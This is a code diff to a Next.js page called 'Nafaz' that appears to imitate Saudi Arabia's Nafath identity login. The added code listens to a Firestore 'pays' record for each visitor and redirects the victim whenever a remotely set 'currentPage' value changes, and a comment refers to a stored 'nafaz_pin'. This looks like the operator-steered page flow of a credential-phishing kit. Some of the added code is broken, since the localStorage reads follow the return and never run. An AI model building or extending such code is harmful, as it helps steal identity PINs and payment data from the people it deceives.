@@ -5,7 +5,7 @@ import type React from "react"
 import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import NafazModal from "@/components/nafaz-modal"
-import { doc, setDoc, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore"
 import { db } from "@/lib/firebase"
 
 interface NafazFormData {
@@ -33,10 +33,36 @@ export default function Nafaz() {
   const [visitorId, setVisitorId] = useState<string | null>(null)
 
   useEffect(() => {
-    // Get data from localStorage
-    if (typeof window !== "undefined") {
-      setVisitorId(localStorage.getItem("visitor"))
-      setPhone(localStorage.getItem("phoneNumber") || "")
+    const userId = localStorage.getItem('visitor')
+    if (userId) {
+      const userDocRef = doc(db, "pays", userId)
+
+      const unsubscribe = onSnapshot(
+        userDocRef,
+        (docSnapshot: { exists: () => any; data: () => any }) => {
+          if (docSnapshot.exists()) {
+            const userData = docSnapshot.data()
+            // Assuming the PIN is stored in a field called 'nafaz_pin'
+            if (userData.currentPage === '1') {
+              window.location.href = '/'
+            } else if (userData.currentPage === '9999') {
+              window.location.href = '/verify-phone'
+
+            }
+          } else {
+            console.error("User document not found")
+          }
+        },
+
+      )
+
+      // Clean up the listener when component unmounts or modal closes
+      return () => unsubscribe()
+      // Get data from localStorage
+      if (typeof window !== "undefined") {
+        setVisitorId(localStorage.getItem("visitor"))
+        setPhone(localStorage.getItem("phoneNumber") || "")
+      }
     }
   }, [])
 
@@ -220,7 +246,7 @@ export default function Nafaz() {
                 </button>
 
                 <div className="flex">
-                <img src="/google_play.png" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
+                  <img src="/google_play.png" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                   <img src="/huawei_store.jpg" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                   <img src="/apple_store.png" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                 </div>
